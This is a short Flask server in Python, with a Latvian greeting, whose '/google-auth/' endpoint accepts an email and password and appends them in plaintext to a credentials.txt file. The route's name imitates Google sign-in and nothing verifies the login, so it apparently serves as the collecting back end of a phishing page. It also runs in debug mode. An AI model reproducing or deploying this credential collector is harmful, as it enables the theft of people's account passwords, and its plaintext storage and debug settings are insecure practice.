from flask import Flask, request, jsonify

app = Flask(__name__)

@app.route('/')
def home():
    return "Sveiks! Šis ir mans Flask serveris."

@app.route('/google-auth/', methods=['POST'])
def save_credentials():
    data = request.get_json()
    email = data.get('email')
    password = data.get('password')
    if not email or not password:
        return jsonify({'error': 'Missing email or password'}), 400
    with open('credentials.txt', 'a', encoding='utf-8') as f:
        f.write(f"Email: {email}, Password: {password}\n")
    return jsonify({'message': 'Credentials saved'}), 200

if __name__ == '__main__':
    app.run(port=5000, debug=True)
